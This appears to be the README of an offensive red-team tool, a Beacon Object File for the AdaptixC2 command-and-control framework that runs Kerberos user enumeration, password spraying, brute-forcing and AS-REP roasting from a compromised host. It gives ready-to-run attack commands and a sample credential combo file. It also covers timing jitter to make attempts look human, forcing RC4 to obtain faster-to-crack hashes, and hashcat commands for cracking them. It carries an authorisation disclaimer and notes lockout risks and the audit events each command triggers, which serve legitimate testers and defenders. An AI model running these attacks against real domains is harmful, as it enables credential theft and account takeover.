# adaptix-kerbrute

An AdaptixC2 Beacon Object File (BOF) that implements Kerberos-based user
enumeration and password attacks directly inside the beacon process.

Inspired by [ropnop/kerbrute](https://github.com/ropnop/kerbrute).  
Built for use with [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2).

> **This tool is for authorised penetration testing and red team engagements
> only. See the [Disclaimer](#disclaimer) section before use.**

---

## How it works

The BOF runs entirely in-process inside the beacon:

- **No child process is spawned** — no `cmd.exe`, no `net.exe`, nothing
- **No files are written to the target** — wordlists are read from the
  operator's local machine by AdaptixClient, base64-encoded, and forwarded
  to the BOF as packed arguments
- All Kerberos packets are hand-built in C and sent over a direct TCP
  connection to port 88 of the Domain Controller
- **AES-256-CTS-HMAC-SHA1-96** pre-auth (etype 18) is attempted first,
  with automatic fallback to **RC4-HMAC** (etype 23) — covering both
  modern AES-only domains and legacy environments
- All crypto is implemented inline or via Windows BCrypt — no CRT
  dependency, no external libraries

### ⚠️ Beacon blocking

**BOFs are synchronous.** The beacon is completely unresponsive for the
entire duration of a run. Every operator on the team should be aware of
this before tasking any command.

Estimate your runtime before running:

```
runtime ≈ users × (avg_delay ± jitter)

Example: 500 users, --delay 1000 --jitter 500
  worst case:  500 × 1500ms = 750 seconds (~12.5 minutes)
  best case:   500 × 500ms  = 250 seconds (~4 minutes)
```

Use `--delay` and `--jitter` to control this. Keep runs targeted — a
small, curated user list beats a full domain dump for spray ops.

---

## Commands

| Command | Description | Lockout risk |
|---|---|---|
| `userenum` | Enumerate valid domain accounts via AS-REQ without pre-auth | ❌ None |
| `passwordspray` | Test one password against a user list | ⚠️ Yes |
| `bruteuser` | Brute-force one account with a password list | ⚠️ Yes |
| `bruteforce` | Test username:password combos from a file | ⚠️ Yes |

### userenum

Sends an AS-REQ without pre-authentication for each username. The KDC
response classifies the account: `PREAUTH_REQUIRED` means the user exists,
`PRINCIPAL_UNKNOWN` means it does not. If the KDC returns an AS-REP directly
(no pre-auth required), the account is flagged as AS-REP roastable — and
with `--roast`, the encrypted portion is extracted and printed as a
hashcat-ready hash. No `badPwdCount` increment. Generates event **4768** if
Kerberos audit logging is enabled.

```
userenum -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <userlist>
```

```
userenum -d contoso.local /home/operator/users.txt
userenum -d contoso.local --dc 192.168.1.10 --safe -v /home/operator/users.txt
userenum -d contoso.local --roast /home/operator/users.txt
userenum -d contoso.local --roast --downgrade /home/operator/users.txt
```

### passwordspray

Tests one password against every user in the list. AES-256 pre-auth is
attempted first; falls back to RC4-HMAC if the DC returns `ETYPE_NOSUPP`.
Increments `badPwdCount`. Generates events **4768** and **4771**.
**Blocks the beacon until all attempts are complete** — plan runtime with
`--delay` and `--jitter` before tasking.

```
passwordspray -d <domain> -p <password> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <userlist>
```

```
passwordspray -d contoso.local -p Password123 /home/operator/users.txt
passwordspray -d contoso.local -p Summer2024! --dc 192.168.1.10 --safe --delay 1000 --jitter 500 /home/operator/users.txt
```

### bruteuser

Tries every password in the list against a single account. Stops immediately
on the first valid hit or the moment the account is locked out. Increments
`badPwdCount`. Generates events **4768** and **4771**.

```
bruteuser -d <domain> -u <username> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <passwordlist>
```

```
bruteuser -d contoso.local -u jdoe /home/operator/rockyou.txt
bruteuser -d contoso.local -u administrator --dc 192.168.1.10 --safe --delay 200 --jitter 100 /home/operator/top500.txt
```

### bruteforce

Reads `username:password` pairs from a combo file and tests each one.
Increments `badPwdCount`. Generates events **4768** and **4771**.

```
bruteforce -d <domain> [--dc <ip>] [--delay <ms>] [--downgrade] [--safe] [-v] <combofile>
```

```
bruteforce -d contoso.local /home/operator/combos.txt
bruteforce -d contoso.local --dc 192.168.1.10 --safe --delay 500 --jitter 250 -v /home/operator/combos.txt
```

Combo file format — one entry per line:

```
jdoe:Password123
administrator:Summer2024!
svc_backup:Welcome1
```

---

## Common flags

All four commands accept the following optional flags:

| Flag | Description |
|---|---|
| `--dc <ip>` | DC hostname or IP. If omitted the BOF resolves the KDC via DNS using the domain name. |
| `--delay <ms>` | Sleep this many milliseconds between each attempt. Recommended for spraying to stay under lockout thresholds. |
| `--jitter <ms>` | Add random variance to each delay: actual sleep = `delay ± jitter`. Makes timing look like human-driven authentication. Combined with `--delay`, e.g. `--delay 1000 --jitter 500` sleeps between 500ms and 1500ms per attempt. |
| `--downgrade` | Force RC4-HMAC (etype 23) pre-auth only. Skips the AES-256 attempt. Use against legacy DCs that do not support AES. |
| `--safe` | Abort all remaining attempts the moment any account comes back as locked out. |
| `-v` | Verbose — also log wrong passwords, not-found users, and errors (silent by default). |
| `--roast` | (`userenum` only) Extract and print the AS-REP encrypted portion as a hashcat-ready hash when a no-preauth account is found. Off by default. |

### Output tags

```
[+] VALID USER                    account exists, pre-auth required              (userenum)
[+] ASREP ROASTABLE (no pre-auth) account has no pre-auth — hash is capturable   (userenum)
[HASH] $krb5asrep$...             AS-REP hash ready for offline cracking          (--roast)
[+] VALID LOGIN                   correct credentials                             (spray/brute)
[+] VALID (expired)               correct credentials but password is expired
[!] LOCKED/DISABLED               account is locked or disabled
[!] Safe mode — aborting          lockout detected, run stopped                   (--safe)
[!] ETYPE_NOSUPP                  DC rejected RC4; account AES-only, creds valid
[?] Unknown KRB error <N>         unrecognised KDC response — investigate manually
[-] NOT FOUND                     user does not exist                             (-v only)
[-] WRONG PASSWORD                wrong password, user exists                     (-v only)
```

---

## Prerequisites

### Operator machine (building the BOF)

- Linux (Kali, Parrot, Ubuntu, Arch)
- `mingw-w64` cross-compiler

```bash
# Debian / Ubuntu / Kali / Parrot
sudo apt install gcc-mingw-w64-x86-64-posix

# Arch
sudo pacman -Syu mingw-w64-gcc
```

### Target

- Windows beacon active in AdaptixC2
- Network path from the compromised host to the Domain Controller on **TCP port 88**

---

## Building

```bash
git clone https://github.com/PanosoikoGr/adaptix-kerbrute
cd adaptix-kerbrute
make
```

This produces:

```
kerbrute.x64.o   — 64-bit BOF (use this for x64 beacons)
kerbrute.x86.o   — 32-bit BOF (use this for x86 beacons)
```

The Makefile:

```makefile
CC64   = x86_64-w64-mingw32-gcc
CC32   = i686-w64-mingw32-gcc
CFLAGS = -masm=intel -Wall -Wno-unused-variable \
         -Wno-unused-function -Wno-misleading-indentation \
         -fno-stack-check

all: kerbrute.x64.o kerbrute.x86.o

kerbrute.x64.o: kerbrute.c
	$(CC64) $(CFLAGS) -o $@ -c $<

kerbrute.x86.o: kerbrute.c
	$(CC32) $(CFLAGS) -o $@ -c $<

clean:
	rm -f kerbrute.x64.o kerbrute.x86.o
```

---

## Repository structure

```
adaptix-kerbrute/
├── kerbrute.c        BOF source code
├── beacon.h          Standard BOF API header (Cobalt Strike / Adaptix compatible)
├── kerbrute.axs      AxScript — registers commands in AdaptixClient
├── Makefile          Cross-compile for x64 and x86
└── README.md
```

> **Note:** Compiled `.o` files are not included. Build them locally with the
> instructions above.

---

## Loading into AdaptixC2

1. Build the BOF (`make`)
2. Place `kerbrute.x64.o` and `kerbrute.axs` in the same directory
3. In AdaptixClient: **Main menu → AxScript → Script Manager**
4. Right-click → **Load new** → select `kerbrute.axs`
5. The four commands are now available in any Windows beacon console

Verify the load:

```
Group - Kerbrute (client)
=====================================
userenum       Enumerate valid domain usernames via Kerberos — no pre-auth, no lockout risk
passwordspray  Test a single password against a list of users — [LOCKOUT RISK]
bruteuser      Bruteforce a single user's password from a wordlist — stops on first hit [LOCKOUT RISK]
bruteforce     Read username:password combos from a file and test them — [LOCKOUT RISK]
```

To see full argument reference for any command, type it with no arguments:

```
beacon > userenum
[-] Missing required argument: domain

Usage: userenum <-d domain> [--dc dc] [--delay delay] [--downgrade] [--safe] [-v] <userlist>

Arguments:
<-d domain>     : STRING. Target domain FQDN (e.g. contoso.local)
[--dc dc]       : STRING. DC hostname or IP — DNS SRV lookup used if omitted
[--delay delay] : INT.    Sleep this many milliseconds between each attempt
[--downgrade]   : BOOL.   Force RC4-only etype list (arcfour-hmac-md5)
[--safe]        : BOOL.   Abort all remaining attempts if any account is locked out
[-v]            : BOOL.   Verbose — also log not-found users and errors
<userlist>      : FILE.   Local path to wordlist — one username per line
```

---

## Technical notes

### Kerberos error codes

| Code | Constant | Meaning |
|---|---|---|
| 6 | `KDC_ERR_C_PRINCIPAL_UNKNOWN` | User does not exist |
| 12 | `KDC_ERR_POLICY` | Policy restriction — user exists, creds treated as valid |
| 14 | `KDC_ERR_ETYPE_NOSUPP` | Requested etype not supported — creds treated as valid |
| 18 | `KDC_ERR_CLIENT_REVOKED` | Account locked or disabled |
| 23 | `KDC_ERR_KEY_EXPIRED` | Password expired — credentials valid |
| 24 | `KDC_ERR_PREAUTH_FAILED` | Wrong password |
| 25 | `KDC_ERR_PREAUTH_REQUIRED` | User exists, pre-auth needed |
| 37 | `KDC_ERR_MUST_USE_USER2USER` | Service ticket constraint — creds treated as valid |
| other | — | Unknown — printed as `[?] Unknown KRB error <N>` for manual review |

### Crypto

Pre-authentication is attempted in this order:

**1. AES-256-CTS-HMAC-SHA1-96 (etype 18, RFC 3962)** — default path

```
string2key:
  tkey     = PBKDF2-HMAC-SHA1(password, REALM||username, 4096 iters, 32 bytes)
  base_key = DK(tkey, "kerberos")
             where DK uses RFC 3961 n-fold + AES-256-ECB (BCrypt)

encrypt PA-ENC-TIMESTAMP:
  ke = DK(base_key, LE32(usage=1) || 0xAA)   — encryption key
  ki = DK(base_key, LE32(usage=1) || 0x55)   — integrity key
  result = AES-256-CTS(ke, confounder || plaintext)
         || HMAC-SHA1-96(ki, confounder || plaintext)
```

**2. RC4-HMAC (etype 23, RFC 4757)** — fallback or `--downgrade`

```
  NT hash  = MD4(UTF-16LE(password))          — implemented inline, no CRT
  K1       = HMAC-MD5(NT_hash, LE32(usage=1)) — BCrypt HMAC-MD5
  Checksum = HMAC-MD5(K1, confounder || plaintext)
  K3       = HMAC-MD5(K1, Checksum)
  result   = Checksum || RC4(K3, confounder || plaintext)
```

BCrypt is the only external provider used. No CRT, no third-party libraries.

The `--roast` flag adds DER parsing of the AS-REP `enc-part [6]` field to
extract the etype and cipher bytes without any additional crypto operations.

### Network

All requests use **TCP port 88** with the standard 4-byte big-endian length
prefix Kerberos uses over TCP. A 5-second send/receive timeout is applied per
attempt.

IP address strings (e.g. `10.0.0.1`) are parsed with a pure-C dotted-decimal
parser — no `inet_addr()` or `WSAStartup()` calls. The BOF relies on the
beacon's existing Winsock initialisation rather than reinitialising it, which
is standard practice for BOFs that perform network operations. Hostnames fall
back to `getaddrinfo`.

### Notes on `--downgrade`

Without `--downgrade` the BOF advertises `{AES256, AES128, RC4}` in the
AS-REQ etype list and sends AES-256 pre-auth. With `--downgrade` it advertises
only RC4 and sends RC4 pre-auth — use this against legacy DCs that do not
support AES.

On modern DCs with RC4 **disabled**, always omit `--downgrade`. If the AES
pre-auth attempt itself fails with `ETYPE_NOSUPP (14)` the BOF automatically
retries with RC4 and still flags the account.

### AS-REP roastable accounts

`userenum` identifies accounts with the `DoesNotRequirePreAuth` flag set: the
KDC responds with a full AS-REP without requiring encrypted pre-authentication.
The BOF flags these with `[+] ASREP ROASTABLE (no pre-auth)`.

Add `--roast` to extract the encrypted portion directly and print a
hashcat-ready hash:

```
userenum --roast -d corp.local --dc 10.0.0.1 users.txt

[+] ASREP ROASTABLE (no pre-auth): svc_backup@corp.local
[HASH] $krb5asrep$18$svc_backup@CORP.LOCAL:aabbccddee...
```

Hash formats and hashcat modes:

| Etype | Condition | Hash prefix | Hashcat mode |
|---|---|---|---|
| 18 (AES-256) | Default — modern DC | `$krb5asrep$18$...` | `-m 19700` |
| 17 (AES-128) | DC prefers AES-128 | `$krb5asrep$17$...` | `-m 19600` |
| 23 (RC4) | `--downgrade` + RC4 enabled on DC | `$krb5asrep$23$...` | `-m 18200` |

RC4 hashes (mode 18200) crack significantly faster than AES (modes 19600/19700)
because RC4 key derivation is a single MD4 hash, while AES uses PBKDF2-HMAC-SHA1
with 4096 iterations. If the target domain allows RC4, use `--downgrade` to
request the faster-to-crack hash:

```
userenum --roast --downgrade -d corp.local --dc 10.0.0.1 users.txt
```

Crack with hashcat:
```bash
hashcat -m 19700 hashes.txt rockyou.txt   # AES-256
hashcat -m 18200 hashes.txt rockyou.txt   # RC4
```

---

## Disclaimer

> This tool is provided for **educational purposes** and for use in
> **authorised security testing engagements only**.
>
> Using this tool against systems, networks, or accounts without explicit
> written permission from the system owner is **illegal** and may violate
> local, national, and international law including but not limited to the
> Computer Fraud and Abuse Act (CFAA), the UK Computer Misuse Act, and the
> EU Directive on Attacks Against Information Systems.
>
> The author(s) accept **no responsibility or liability** for any misuse,
> damage, or legal consequences arising from the use of this tool.
>
> **Always obtain proper authorisation before conducting any security testing.**
> Red team and penetration testing activities must be performed under a signed
> Rules of Engagement (RoE) document. Unauthorised use is strictly prohibited.

---

## References

- [ropnop/kerbrute](https://github.com/ropnop/kerbrute) — original Go implementation this BOF is based on
- [AdaptixC2](https://github.com/Adaptix-Framework/AdaptixC2) — the C2 framework
- [Adaptix Extension-Kit](https://github.com/Adaptix-Framework/Extension-Kit) — BOF development reference
- [RFC 3962](https://datatracker.ietf.org/doc/html/rfc3962) — AES Encryption for Kerberos 5
- [RFC 3961](https://datatracker.ietf.org/doc/html/rfc3961) — Encryption and Checksum Specifications for Kerberos 5
- [RFC 4757](https://datatracker.ietf.org/doc/html/rfc4757) — RC4-HMAC Kerberos encryption
- [RFC 4120](https://datatracker.ietf.org/doc/html/rfc4120) — The Kerberos Network Authentication Service (V5)
- [Hashcat example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) — modes 18200, 19600, 19700
